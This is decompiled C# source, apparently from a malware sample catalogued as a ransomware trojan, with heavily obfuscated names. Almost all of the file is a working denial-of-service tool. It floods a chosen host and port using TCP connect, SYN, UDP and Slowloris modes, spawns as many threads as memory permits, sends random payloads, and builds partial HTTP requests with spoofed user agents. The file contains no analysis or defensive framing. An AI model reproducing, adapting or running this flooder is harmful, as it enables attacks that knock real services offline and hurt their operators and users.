// Decompiled with JetBrains decompiler
// Type: ẍ߮ᑐᗭ৲ᗒ̛ᗫ།ཏӍᡸẗ᡽़य़ᢠ᛭༌.̛ሞᙋೢྋȂ
// Assembly: start1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B30574D9-5740-4AF1-9AAD-FBD9FE6B2A96
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-89f3ccf08032a8f789a4d56feebe797fb02d3c983b9f4783b0428640dbafc04e.exe

using System;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using ẍ߮ᑐᗭ\u09F2ᗒ̛ᗫ\u0F0DཏӍ\u1878ẗ\u187D़य़ᢠ\u16ED\u0F0C;

namespace ẍ߮ᑐᗭ\u09F2ᗒ̛ᗫ\u0F0DཏӍ\u1878ẗ\u187D़य़ᢠ\u16ED\u0F0C
{
  internal class \u031BሞᙋೢྋȂ
  {
    private static \u031BሞᙋೢྋȂ.طۀኈྲᚿẴ\u10CCᚺࠏᴾԙᱶ\u087B\u1B6A֠ວࢲᇁ ၼ\u0009ᯡ\u0ADFŉ\u05EFࠥ;
    private static bool \u0746ᄤỻ\u0E86ව\u0CDBफ़݈\u17D5ࣺᕯឰɥᑵ\u1A9D\u16FCϊᦺᘶ;
    private static string \u1B82᭬ጢ೭\u0BA0ᩣᦀᓻa\u0FF5ἒ\u0D5Eၾሾᥲ᷅ᅩ;
    private static int \u1C87ᰯ\u1AA5ᅺᣠቨٷᨊʸᭆҬӤܔێ\u0EF9\u0E3Fȣଚᵁ;
    private static int \u02E5ኜኛᎣۦߠनࠑܲསᩃᰘ֒;
    private static int ᱳ᥆᷁ਈʌº;
    private static int ზឫᵹ\u104E᪼\u08E1ᡃᶤ;
    private static ᆙסю\u17DB឵ኧಋྩ\u0FD5ူǕߋዹো ယ๘\u0083ẛ᱒৪;
    private static string[] \u0701ઓჿीᶦዘኑăߓ = new string[28]
    {
      "(compatible; MSIE 6.0; Windows NT)",
      "(Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9b5) Gecko/2008032619 Firefox/3.0b5",
      "(Windows; U; Windows NT 5.1; en-US; rv:1.8.0.5) Gecko/20060731 Firefox/1.5.0.5 Flock/0.7.4.1 ",
      "(MobilePhone SCP-5500/US/1.0) NetFront/3.0 MMP/2.0 (compatible; Googlebot/2.1; http://www.google.com/bot.html)",
      "[en] (WinNT; U)",
      "(compatible; MSIE 7.0; Windows NT 5.1; bgft) ",
      "(compatible; MSIE 6.0; Win32)",
      "(X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",
      "(X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801",
      "(SunOS 5.8 sun4u; U) Opera 5.0 [en]",
      "(compatible; Googlebot/2.1; http://www.google.com/bot.html)  ",
      "(X11; U; Linux i686; en-US; rv:1.8) Gecko/20051111 Firefox/1.5 BAVM/1.0.0",
      "(X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8 ",
      "(Windows; U; Windows NT 6.1; it; rv:1.9.2) Gecko/20100115 Firefox/3.6",
      "Galeon/1.2.0 (X11; Linux i686; U;) Gecko/20020326",
      "(Windows NT 5.1; U; en) Presto/2.5.22 Version/10.50",
      "(Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10",
      "(X11; Linux x86_64; U; Linux Mint; en) Presto/2.2.15 Version/10.10",
      "(Macintosh; PPC Mac OS X; U; en) Opera 8.0",
      "(Windows; U; Windows NT 5.1; en-US; rv:0.9.6) Gecko/20011128",
      "(Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
      "(iPhone; U; CPU like Mac OS X; en) AppleWebKit/420.1 (KHTML, like Gecko) Version/3.0 Mobile/4A93 Safari/419.3",
      "(compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET CLR 4.0.20402; MS-RTC LM 8)",
      "(Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
      "(compatible; MSIE 6.1; Windows XP; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
      "(compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)",
      "(compatible; MSIE 6.1; Windows XP)",
      "(Windows; U; Windows NT 6.1; nl; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3"
    };
    private static string[] \u0341ছᓲ\u0FBE\u175B\u088E\u1C87ஙᅏᨱᑡ͔୩ḾဤবӲẌ௪ = new string[10]
    {
      "Mozilla/3.0 ",
      "Mozilla/3.1 ",
      "Mozilla/3.6 ",
      "Mozilla/4.0 ",
      "Mozilla/4.08 ",
      "Mozilla/5.0 ",
      "Opera/9.33 ",
      "Opera/9.0 ",
      "Opera/8.90 ",
      "Opera/9.80 "
    };

    public static \u031BሞᙋೢྋȂ.طۀኈྲᚿẴ\u10CCᚺࠏᴾԙᱶ\u087B\u1B6A֠ວࢲᇁ ਖॽᄕጉᗯଆ\u08E1\u1249ւÂᷪᔅඡཅ => \u031BሞᙋೢྋȂ.ၼ\u0009ᯡ\u0ADFŉ\u05EFࠥ;

    public static string ḛA઼ᔄ᱂\u1AD4Ĝፍᢤ
    {
      get
      {
        switch (\u031BሞᙋೢྋȂ.ၼ\u0009ᯡ\u0ADFŉ\u05EFࠥ)
        {
          case \u031BሞᙋೢྋȂ.طۀኈྲᚿẴ\u10CCᚺࠏᴾԙᱶ\u087B\u1B6A֠ວࢲᇁ.\u05CA̼ጂଃ\u0EF9ᑲέṪሀᡛᏹ\u0DE5ፅᑘ\u0B7Fᡚ:
            return "TCP";
          case \u031BሞᙋೢྋȂ.طۀኈྲᚿẴ\u10CCᚺࠏᴾԙᱶ\u087B\u1B6A֠ວࢲᇁ.ᙓՀᠾ៧ᜁ\u05CDΉፐᔗᜫᨙ༾ᢞżúቱڍؠ:
            return "SYN";
          case \u031BሞᙋೢྋȂ.طۀኈྲᚿẴ\u10CCᚺࠏᴾԙᱶ\u087B\u1B6A֠ວࢲᇁ.ት\u1AFDΎ᩿\u1311Iḋᶞፕམᄓࠝ\u1C3B̐टប:
            return "UDP";
          case \u031BሞᙋೢྋȂ.طۀኈྲᚿẴ\u10CCᚺࠏᴾԙᱶ\u087B\u1B6A֠ວࢲᇁ.ᣂ\u0017จ\u1CAFླྀᛲ:
            return "Slowloris";
          default:
            return (string) null;
        }
      }
    }

    public static bool Źྩᄥ\u0E7Eଇোӄᣂᅵ\u1B62ᯧቻ => \u031BሞᙋೢྋȂ.\u0746ᄤỻ\u0E86ව\u0CDBफ़݈\u17D5ࣺᕯឰɥᑵ\u1A9D\u16FCϊᦺᘶ;

    public static void \u1A8CࠗޡᎰઢ\u1AE4ᝯༀ\u08DBੈᘭᙿ(
      \u031BሞᙋೢྋȂ.طۀኈྲᚿẴ\u10CCᚺࠏᴾԙᱶ\u087B\u1B6A֠ວࢲᇁ _param0,
      string _param1,
      int _param2,
      int _param3,
      int _param4,
      int _param5,
      ᆙסю\u17DB឵ኧಋྩ\u0FD5ူǕߋዹো _param6)
    {
      \u031BሞᙋೢྋȂ.ၼ\u0009ᯡ\u0ADFŉ\u05EFࠥ = _param0;
      \u031BሞᙋೢྋȂ.\u1B82᭬ጢ೭\u0BA0ᩣᦀᓻa\u0FF5ἒ\u0D5Eၾሾᥲ᷅ᅩ = _param1;
      \u031BሞᙋೢྋȂ.\u1C87ᰯ\u1AA5ᅺᣠቨٷᨊʸᭆҬӤܔێ\u0EF9\u0E3Fȣଚᵁ = _param2;
      \u031BሞᙋೢྋȂ.\u02E5ኜኛᎣۦߠनࠑܲསᩃᰘ֒ = _param3;
      \u031BሞᙋೢྋȂ.ზឫᵹ\u104E᪼\u08E1ᡃᶤ = _param4;
      \u031BሞᙋೢྋȂ.ᱳ᥆᷁ਈʌº = _param5;
      \u031BሞᙋೢྋȂ.ယ๘\u0083ẛ᱒৪ = _param6;
      \u031BሞᙋೢྋȂ.\u0746ᄤỻ\u0E86ව\u0CDBफ़݈\u17D5ࣺᕯឰɥᑵ\u1A9D\u16FCϊᦺᘶ = false;
    }

    public static void ኗRἌ\u0EA9\u0D5C\u0CDB\u0E74ᶄ()
    {
      \u031BሞᙋೢྋȂ.\u0746ᄤỻ\u0E86ව\u0CDBफ़݈\u17D5ࣺᕯឰɥᑵ\u1A9D\u16FCϊᦺᘶ = true;
      new Thread(new ThreadStart(\u031BሞᙋೢྋȂ.\u0085ᄻᵧᖑ੩\u0FE9ᢶᎾତᔺᤡ᱐Ȃųỵ)).Start();
    }

    public static void ᥴࠅἔӡ\u0ECFॆ() => \u031BሞᙋೢྋȂ.\u0746ᄤỻ\u0E86ව\u0CDBफ़݈\u17D5ࣺᕯឰɥᑵ\u1A9D\u16FCϊᦺᘶ = false;

    private static void \u0085ᄻᵧᖑ੩\u0FE9ᢶᎾତᔺᤡ᱐Ȃųỵ()
    {
      for (int index = 0; index < \u031BሞᙋೢྋȂ.\u02E5ኜኛᎣۦߠनࠑܲསᩃᰘ֒; ++index)
      {
        try
        {
          new Thread(new ThreadStart(\u031BሞᙋೢྋȂ.ઊᨎ੩໐ᦆܐՈằ\u0025ү᷊ᢤܹ͠\u0EE9ᱵ))
          {
            IsBackground = true
          }.Start();
        }
        catch (OutOfMemoryException ex)
        {
          \u031BሞᙋೢྋȂ.\u02E5ኜኛᎣۦߠनࠑܲསᩃᰘ֒ = index - 1;
          break;
        }
      }
    }

    private static void ઊᨎ੩໐ᦆܐՈằ\u0025ү᷊ᢤܹ͠\u0EE9ᱵ()
    {
      int num = 0;
      while (\u031BሞᙋೢྋȂ.\u0746ᄤỻ\u0E86ව\u0CDBफ़݈\u17D5ࣺᕯឰɥᑵ\u1A9D\u16FCϊᦺᘶ && \u031BሞᙋೢྋȂ.ယ๘\u0083ẛ᱒৪.ǟᴄᴑݫہɹṫঔหʣȿຂዋ̩)
      {
        switch (\u031BሞᙋೢྋȂ.ၼ\u0009ᯡ\u0ADFŉ\u05EFࠥ)
        {
          case \u031BሞᙋೢྋȂ.طۀኈྲᚿẴ\u10CCᚺࠏᴾԙᱶ\u087B\u1B6A֠ວࢲᇁ.\u05CA̼ጂଃ\u0EF9ᑲέṪሀᡛᏹ\u0DE5ፅᑘ\u0B7Fᡚ:
            Socket socket1 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socket1.Blocking = false;
            while (num < \u031BሞᙋೢྋȂ.ზឫᵹ\u104E᪼\u08E1ᡃᶤ && \u031BሞᙋೢྋȂ.\u0746ᄤỻ\u0E86ව\u0CDBफ़݈\u17D5ࣺᕯឰɥᑵ\u1A9D\u16FCϊᦺᘶ)
            {
              if (\u031BሞᙋೢྋȂ.ယ๘\u0083ẛ᱒৪.ǟᴄᴑݫہɹṫঔหʣȿຂዋ̩)
              {
                try
                {
                  socket1.Connect(\u031BሞᙋೢྋȂ.\u1B82᭬ጢ೭\u0BA0ᩣᦀᓻa\u0FF5ἒ\u0D5Eၾሾᥲ᷅ᅩ, \u031BሞᙋೢྋȂ.\u1C87ᰯ\u1AA5ᅺᣠቨٷᨊʸᭆҬӤܔێ\u0EF9\u0E3Fȣଚᵁ);
                  socket1.Send(\u031BሞᙋೢྋȂ.Ϡҝኆᠷ\u0A61ᖛჀᐼީচ());
                  socket1.Close();
                  socket1 = (Socket) null;
                }
                catch
                {
                  socket1.Close();
                  break;
                }
                ++num;
                Thread.Sleep(1);
              }
              else
                break;
            }
            Thread.Sleep(\u031BሞᙋೢྋȂ.ᱳ᥆᷁ਈʌº);
            break;
          case \u031BሞᙋೢྋȂ.طۀኈྲᚿẴ\u10CCᚺࠏᴾԙᱶ\u087B\u1B6A֠ວࢲᇁ.ᙓՀᠾ៧ᜁ\u05CDΉፐᔗᜫᨙ༾ᢞżúቱڍؠ:
            Socket socket2 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socket2.Blocking = false;
            try
            {
              socket2.BeginConnect(\u031BሞᙋೢྋȂ.\u1B82᭬ጢ೭\u0BA0ᩣᦀᓻa\u0FF5ἒ\u0D5Eၾሾᥲ᷅ᅩ, \u031BሞᙋೢྋȂ.\u1C87ᰯ\u1AA5ᅺᣠቨٷᨊʸᭆҬӤܔێ\u0EF9\u0E3Fȣଚᵁ, new AsyncCallback(\u031BሞᙋೢྋȂ.ዩǽᐟቊඖዊྼഃࠬිેἐࣼᓺ໒\u0FF8ᑚᴻ), (object) null);
            }
            catch
            {
            }
            Thread.Sleep(100);
            try
            {
              if (socket2.Connected)
                socket2.Disconnect(false);
              socket2.Close();
            }
            catch
            {
            }
            Thread.Sleep(\u031BሞᙋೢྋȂ.ᱳ᥆᷁ਈʌº);
            break;
          case \u031BሞᙋೢྋȂ.طۀኈྲᚿẴ\u10CCᚺࠏᴾԙᱶ\u087B\u1B6A֠ວࢲᇁ.ት\u1AFDΎ᩿\u1311Iḋᶞፕམᄓࠝ\u1C3B̐टប:
            Socket socket3 = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            socket3.Blocking = false;
            Socket socket4;
            try
            {
              socket3.Connect(\u031BሞᙋೢྋȂ.\u1B82᭬ጢ೭\u0BA0ᩣᦀᓻa\u0FF5ἒ\u0D5Eၾሾᥲ᷅ᅩ, \u031BሞᙋೢྋȂ.\u1C87ᰯ\u1AA5ᅺᣠቨٷᨊʸᭆҬӤܔێ\u0EF9\u0E3Fȣଚᵁ);
              while (num < \u031BሞᙋೢྋȂ.ზឫᵹ\u104E᪼\u08E1ᡃᶤ && \u031BሞᙋೢྋȂ.\u0746ᄤỻ\u0E86ව\u0CDBफ़݈\u17D5ࣺᕯឰɥᑵ\u1A9D\u16FCϊᦺᘶ && \u031BሞᙋೢྋȂ.ယ๘\u0083ẛ᱒৪.ǟᴄᴑݫہɹṫঔหʣȿຂዋ̩)
              {
                socket3.Send(\u031BሞᙋೢྋȂ.\u0877ዯጵ\u00BF\u0894\u1AE3ѦഛӒᡗᰘAཋ());
                ++num;
                Thread.Sleep(1);
              }
              socket3.Close();
              socket4 = (Socket) null;
            }
            catch
            {
              socket3.Close();
              socket4 = (Socket) null;
              break;
            }
            Thread.Sleep(\u031BሞᙋೢྋȂ.ᱳ᥆᷁ਈʌº);
            break;
          case \u031BሞᙋೢྋȂ.طۀኈྲᚿẴ\u10CCᚺࠏᴾԙᱶ\u087B\u1B6A֠ວࢲᇁ.ᣂ\u0017จ\u1CAFླྀᛲ:
            Socket socket5 = (Socket) null;
            try
            {
              socket5 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
              socket5.Connect(\u031BሞᙋೢྋȂ.\u1B82᭬ጢ೭\u0BA0ᩣᦀᓻa\u0FF5ἒ\u0D5Eၾሾᥲ᷅ᅩ, \u031BሞᙋೢྋȂ.\u1C87ᰯ\u1AA5ᅺᣠቨٷᨊʸᭆҬӤܔێ\u0EF9\u0E3Fȣଚᵁ);
              socket5.Send(\u031BሞᙋೢྋȂ.ܫଐւᴨیڱې\u136Bᓨĩॐൢขមṣъ());
              while (socket5.Connected)
              {
                if (\u031BሞᙋೢྋȂ.\u0746ᄤỻ\u0E86ව\u0CDBफ़݈\u17D5ࣺᕯឰɥᑵ\u1A9D\u16FCϊᦺᘶ)
                {
                  if (\u031BሞᙋೢྋȂ.ယ๘\u0083ẛ᱒৪.ǟᴄᴑݫہɹṫঔหʣȿຂዋ̩)
                  {
                    socket5.Send(\u031BሞᙋೢྋȂ.ܫଐւᴨیڱې\u136Bᓨĩॐൢขមṣъ());
                    Thread.Sleep(2000);
                  }
                  else
                    break;
                }
                else
                  break;
              }
            }
            catch
            {
              socket5.Close();
            }
            Thread.Sleep(\u031BሞᙋೢྋȂ.ᱳ᥆᷁ਈʌº);
            break;
        }
        num = 0;
      }
      if (!\u031BሞᙋೢྋȂ.\u0746ᄤỻ\u0E86ව\u0CDBफ़݈\u17D5ࣺᕯឰɥᑵ\u1A9D\u16FCϊᦺᘶ)
        return;
      \u031BሞᙋೢྋȂ.ᥴࠅἔӡ\u0ECFॆ();
    }

    private static void ዩǽᐟቊඖዊྼഃࠬිેἐࣼᓺ໒\u0FF8ᑚᴻ(IAsyncResult ɸᓞქᨢᵲʁϭᔙڐᔑའ)
    {
    }

    private static byte[] \u0877ዯጵ\u00BF\u0894\u1AE3ѦഛӒᡗᰘAཋ()
    {
      Random random = new Random();
      byte[] buffer = new byte[random.Next(1470, 65507)];
      random.NextBytes(buffer);
      return buffer;
    }

    private static byte[] Ϡҝኆᠷ\u0A61ᖛჀᐼީচ()
    {
      Random random = new Random();
      byte[] buffer = new byte[random.Next(1470, (int) ushort.MaxValue)];
      random.NextBytes(buffer);
      return buffer;
    }

    private static byte[] ܫଐւᴨیڱې\u136Bᓨĩॐൢขមṣъ()
    {
      Random random = new Random();
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.AppendLine("GET / HTTP/1.1");
      stringBuilder.AppendLine("Host: " + \u031BሞᙋೢྋȂ.\u1B82᭬ጢ೭\u0BA0ᩣᦀᓻa\u0FF5ἒ\u0D5Eၾሾᥲ᷅ᅩ);
      stringBuilder.AppendLine("User-Agent: " + \u031BሞᙋೢྋȂ.\u0341ছᓲ\u0FBE\u175B\u088E\u1C87ஙᅏᨱᑡ͔୩ḾဤবӲẌ௪[random.Next(0, \u031BሞᙋೢྋȂ.\u0341ছᓲ\u0FBE\u175B\u088E\u1C87ஙᅏᨱᑡ͔୩ḾဤবӲẌ௪.Length - 1)] + " " + \u031BሞᙋೢྋȂ.\u0701ઓჿीᶦዘኑăߓ[random.Next(0, \u031BሞᙋೢྋȂ.\u0701ઓჿीᶦዘኑăߓ.Length - 1)]);
      stringBuilder.AppendLine("Content-Length: " + random.Next(1, 1000).ToString());
      stringBuilder.AppendLine("X-a: " + random.Next(1, 10000).ToString());
      stringBuilder.Append("Connection: keep-alive");
      return Encoding.ASCII.GetBytes(stringBuilder.ToString());
    }

    public enum طۀኈྲᚿẴ\u10CCᚺࠏᴾԙᱶ\u087B\u1B6A֠ວࢲᇁ
    {
      \u05CA̼ጂଃ\u0EF9ᑲέṪሀᡛᏹ\u0DE5ፅᑘ\u0B7Fᡚ,
      ᙓՀᠾ៧ᜁ\u05CDΉፐᔗᜫᨙ༾ᢞżúቱڍؠ,
      ት\u1AFDΎ᩿\u1311Iḋᶞፕམᄓࠝ\u1C3B̐टប,
      ᣂ\u0017จ\u1CAFླྀᛲ,
    }
  }
}
